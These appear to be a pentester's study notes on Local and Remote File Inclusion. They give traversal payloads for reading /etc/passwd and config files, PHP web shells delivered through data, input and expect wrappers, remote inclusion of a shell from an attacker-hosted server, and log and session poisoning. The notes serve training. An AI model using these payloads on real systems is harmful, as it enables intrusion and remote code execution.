**Manipulating Parameters in web pages to display the content of other files**
# Local File Inclusion (LFI)
* Most commonly found within templating engines.
* Web page often contains a header, footer and navigation bar so it looks the same. This is static and the rest is loaded dynamically 
## PHP
* `/index.php?page=about` index.php is statics and about is dynamic
```php
if (isset($_GET['language'])){
	include($_GET['language']);
}
```
Any path passed into language will be loaded on the page.
Commonly vulnerable functions
```php
require()
require_once()
file_get_contents()
include_once()
```
## NoseJS
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
Whatever parameter passed from the HTTP GET gets used by `readfile` which then writes the contents in the HTTP response.
```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Takes the parameter from the URL and renders it. Changing the URL will show a new file
## Java
```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
`Include` function takes a file or page URL as its argument and then renders the object into the front end.
```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```
`Import` function can be used to render a local file or URL
## .NET
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
`Response.WriteFile` takes a file path or its inputs and writes its content to the response. 
Path may be retrieved from a GET parameter
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```
Can render a file as part of its frond end template
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```
Use to render local or remote files and URLs.
## Read vs Execute
|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

# File Disclosure 
## LFI
```URL
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
### File Traversal
If the function users the whole path you can use the absolute path.
Else you'll need to do the relative path 
```url 
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```
### Filename Prefix
```php
include("lang_" . $_GET['language']);
```
File goes from `lang_../.....`
Need to use the relative path 
### Second-Order Attacks
Web applications may allow us to download our avatar through a URL like `/profile/$username/avatar.png`. May be able to grab `../../../../../etc/passwd` in the avatar photo.

## Basic Bypasses
### Non-Recursive Path Traversal Filters
```php
$language = str_replace('../', '', $_GET['language']);
```
Replaces `../`
Can still use `....//`
### Encoding 
`../` encodes into `%2e%2e%2f`
Need to encode all characters
### Approved Paths
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
* Find approved paths by examining requests from existing forms.
* Fuzz web directories under the same path
`./languages../../../../etc/passwd`

### Appended Extension 
#### Path Truncation 
Earlier versions of PHP strings have a maximum length of 4096 characters:
```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Automate the creation:
```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

#### Null Bytes 
PHP before 5.5 were vulnerable to null byte injection.
Adding `%00` at the end of the string would prevent PHP interpreting anything after this

## PHP Filters
### Input Filters
* PHP wrappers allow access to different I/Os streams at the application level
* Example wrapper streams:
	* `php://filter/`
* Main wrapper fields:
	* `Resource` and `read`

* Useful ones are [convert.base64-encode](https://www.php.net/manual/en/filters.convert.php)and [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
#### Fuzz for PHP files
```shell
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
Can use web pages with error codes `301, 302 an 403`

#### Standard PHP inclusion 
PHP often does not render anything
Read config.php
```url
php://filter/read=convert.base64-encode/resource=config
```
Example:
```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
Decode base 64 
```shell
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

# Remote Code Execution 
* Easy and common method is to enumerate for SSH keys or passwords in PHP files then login.
	* Look in `config.php` or `.ssh` directory 
## PHP wrappers
* Can be used to include external data, including PHP code.
* Only enabled if the `allow_url_include` setting is enabled in PHP config. 
#### Checking PHP configuration 

```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

##### PHP config locations 
`X.Y` is PHP version

| Platform | Location                      |
| -------- | ----------------------------- |
| Apache   | `/etc/php/X.Y/apache2/php.ini |
| Nginx    | `/etc/php/X.Y/fpn/php.ini`    |

Decode the string
```shell
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

### Remote Code Execution 
#### [Data](https://www.php.net/manual/en/wrappers.data.php)
```shell
echo '<?php system($_GET["cmd"]); ?>' | base64
```

URL:
```url
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Alternate method:
```shell
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

#### [Input](https://www.php.net/manual/en/wrappers.php.php)
* Also needs `allow_url_include` as shown above.
* Wrapper must also except POST requests
Example:
```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

#### [Except](https://www.php.net/manual/en/wrappers.expect.php)
* Directly run commands through the URL streams.
* Don't need to provide a web shell
##### Check if enabled 
```shell
echo '<PHP CONFIG BASE64>' | base64 -d | grep expect
```
##### Example
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


## Remote File Inclusion 
* Allows the inclusion of remote URLs
* Benefits:
	1. Enumerating local-only ports and web applications (SSRF)
	2. Gaining remote code execution by including malicious scripts that we host
### LFI vs RFI
|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

* An LFI is not necessarily a RFI
	1. Vulnerable function may not allow including remote URLs
	2. May only control a portion of the filename and not the protocol wrapper `http://`
	3. Configuration may prevent RFI all together. 
### Verify RFI 
Test for `allow_url_include` setting:
```shell
echo '<PHP config BASE64' | base64 -d | grep allow_url_include
```

Always try and include a local URL
`Do not use a the vulnerable page as this will cause a recursive loop and DoS`

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

### RCE

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
#### HTTP
```shell
sudo python3 -m http.server <LISTENING_PORT>
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

#### FTP
```shell
sudo python -m pyftpdlib -p 21
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
#### SMB
```shell
impacket-smbserver -smb2support share $(pwd)
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
### File Uploads
#### Image Upload
Crafting malicious image
```shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
Upload an image and work out where it gets uploaded too
```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

#### ZIP Upload
Reliable and utilises zip wrapper
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### Phar Upload
Create the following script into shell.php:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Can be compiled into a `phar` file that when called creates a web shell in shell.txt sub file.
Compile it as a `phar` file and renamed to `shell.jpg`
```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
### Log Poisoning

* Writing PHP code in a field gets logged into a log file.
* Need to have write privileges of log file.
#### PHP Session Poisoning 
* PHPSESSID contains user-related data on the back end
* They are saved in:
	* Linux : `/var/lib/php/sessions/`
	* Windows: `C:\Windows\Temp`
* Name of the file matches PHPSESSID cookie with the `sess_` prefix. 
1. Examine your PHPSESSID cookie. 
2. Use LFI to view `/var/lib/php/sessions/sess_<cookie>`

* If you specify the setting you have control off the variable, else you do not.
* Attempt to end the value:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
Read the value
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
Add a command to the session:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
Ideally write a permanent web shell or rev shell from here
#### Server Log Poisoning 
Apache ad Nginx maintain various log files such as `access.log` `error.log`.
* `access.log` contains various information about all requests made to the server. Including the user agent header. 
	* As we control the user-agent we can poison it
	
| Software       | Installed Location     |
| -------------- | ---------------------- |
| Apache Linux   | `/var/log/apache2`     |
| Apache Windows | `C:\xampp\apache\logs` |
| Nginx Linux          | `/var/log/nginx`       |
| Nginx Windows    | `C:\nginx\log`         ||

1. Read the log
```url 
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
This may take a while as logs are often big
2. Edit the User-Agent with a php shell
Curl:
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```
This can be done in burp  as well

This can also be done on other service logs such as:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
First attempt to read the log and then try and poison them
##### Tip
The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

## Automation 
### LFI Scanning
#### Fuzzing Parameters
```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
[LFI wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
#### Fuzzing Server Files
```shell
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
#### Fuzzing Server Logs/Configurations
```shell
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
[Word list for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
[Word list for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

May be able to file log files in the config settings:
```shell
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```
### LFI Tools
[LFISuite](https://github.com/D35m0nd142/LFISuite)
[LFIFreak](https://github.com/OsandaMalith/LFiFreak)
[liffy](https://github.com/mzfr/liffy)
